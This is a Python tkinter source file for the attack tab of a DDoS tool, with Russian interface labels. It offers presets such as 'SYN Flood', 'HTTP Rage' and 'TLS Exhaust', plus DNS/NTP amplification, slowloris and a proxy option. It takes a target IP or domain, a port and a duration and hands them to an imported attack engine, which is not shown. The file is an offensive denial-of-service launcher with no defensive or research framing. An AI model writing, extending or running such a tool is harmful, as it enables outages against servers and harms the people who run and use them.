import tkinter as tk
from tkinter import ttk, messagebox
import threading, json, asyncio
from engine.attack import AsyncAttackEngine
from utils.logger import log
from utils.widgets import ToolTip

class AttackTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.engine = AsyncAttackEngine()
        self.presets = {}
        self.load_presets()
        self.build_ui()
    def load_presets(self):
        try:
            with open("attack_profiles.json","r") as f:
                self.presets = json.load(f)
        except:
            self.presets = {
                "SYN Flood": {"method":"syn","port":80,"duration":60},
                "UDP Storm": {"method":"udp","port":80,"duration":60},
                "ICMP Cannon": {"method":"icmp","port":0,"duration":60},
                "HTTP Rage": {"method":"http","port":80,"duration":120},
                "Multivector Burst": {"method":"multivector","port":80,"duration":120},
                "TLS Exhaust": {"method":"tls_exhaustion","port":443,"duration":120}
            }
    def build_ui(self):
        main_nb = ttk.Notebook(self)
        main_nb.pack(fill=tk.BOTH, expand=True)
        # Вкладка L3/L4
        l4_frame = ttk.Frame(main_nb)
        main_nb.add(l4_frame, text="Сетевой штурм (L3/L4)")
        self.create_method_ui(l4_frame, ["syn","udp","icmp","dns_amp","ntp_amp"])
        # Вкладка L7
        l7_frame = ttk.Frame(main_nb)
        main_nb.add(l7_frame, text="Прикладной удар (L7)")
        self.create_method_ui(l7_frame, ["slowloris","http","multivector","tls_exhaustion"], show_proxy=True)

    def create_method_ui(self, parent, methods, show_proxy=False):
        frame = ttk.Frame(parent)
        frame.pack(fill=tk.X, padx=10, pady=10)
        ttk.Label(frame, text="Метод:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.method_var = tk.StringVar(value=methods[0])
        method_cb = ttk.Combobox(frame, textvariable=self.method_var, values=methods, state="readonly")
        method_cb.grid(row=0, column=1, padx=5)
        ToolTip(method_cb, "Выберите вектор атаки")
        ttk.Label(frame, text="Пресет:").grid(row=1, column=0, padx=5, sticky=tk.W)
        self.preset_var = tk.StringVar()
        preset_cb = ttk.Combobox(frame, textvariable=self.preset_var, values=[""]+list(self.presets.keys()), state="readonly")
        preset_cb.grid(row=1, column=1, padx=5)
        ToolTip(preset_cb, "Быстрая загрузка профиля")
        self.preset_var.trace('w', self.on_preset)
        ttk.Label(frame, text="Цель:").grid(row=2, column=0, padx=5, sticky=tk.W)
        self.target_entry = ttk.Entry(frame, width=30)
        self.target_entry.grid(row=2, column=1, padx=5)
        ToolTip(self.target_entry, "IP или домен")
        ttk.Label(frame, text="Порт:").grid(row=3, column=0, padx=5, sticky=tk.W)
        self.port_entry = ttk.Entry(frame, width=10)
        self.port_entry.insert(0, "80")
        self.port_entry.grid(row=3, column=1, padx=5, sticky=tk.W)
        ToolTip(self.port_entry, "Порт")
        ttk.Label(frame, text="Длительность (с):").grid(row=4, column=0, padx=5, sticky=tk.W)
        self.duration_entry = ttk.Entry(frame, width=10)
        self.duration_entry.insert(0, "60")
        self.duration_entry.grid(row=4, column=1, padx=5, sticky=tk.W)
        if show_proxy:
            self.use_proxy_var = tk.BooleanVar(value=False)
            ttk.Checkbutton(frame, text="Использовать прокси", variable=self.use_proxy_var).grid(row=5, column=0, columnspan=2)
        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=6, column=0, columnspan=2, pady=10)
        self.start_btn = ttk.Button(btn_frame, text="ЗАПУСТИТЬ", command=self.start)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        self.stop_btn = ttk.Button(btn_frame, text="СТОП", command=self.stop, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        self.status = ttk.Label(frame, text="Готов")
        self.status.grid(row=7, column=0, columnspan=2)
        self.progress = ttk.Progressbar(frame, mode='indeterminate')
        self.progress.grid(row=8, column=0, columnspan=2, sticky=tk.EW, pady=5)

    def on_preset(self, *args):
        name = self.preset_var.get()
        if name in self.presets:
            p = self.presets[name]
            self.method_var.set(p['method'])
            self.port_entry.delete(0,tk.END)
            self.port_entry.insert(0, str(p['port']))
            self.duration_entry.delete(0,tk.END)
            self.duration_entry.insert(0, str(p['duration']))
    def start(self):
        method = self.method_var.get()
        target = self.target_entry.get()
        port = int(self.port_entry.get())
        duration = int(self.duration_entry.get())
        use_proxy = self.use_proxy_var.get() if hasattr(self, 'use_proxy_var') else False
        self.status.config(text="Атака идёт...")
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.progress.start()
        threading.Thread(target=self._run, args=(method, target, port, duration, use_proxy), daemon=True).start()
    def stop(self):
        self.status.config(text="Остановлено")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.progress.stop()
    def _run(self, method, target, port, duration, use_proxy):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.engine.run_attack(method, target, port, duration, use_proxy=use_proxy))
        self.status.config(text="Завершено")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.progress.stop()
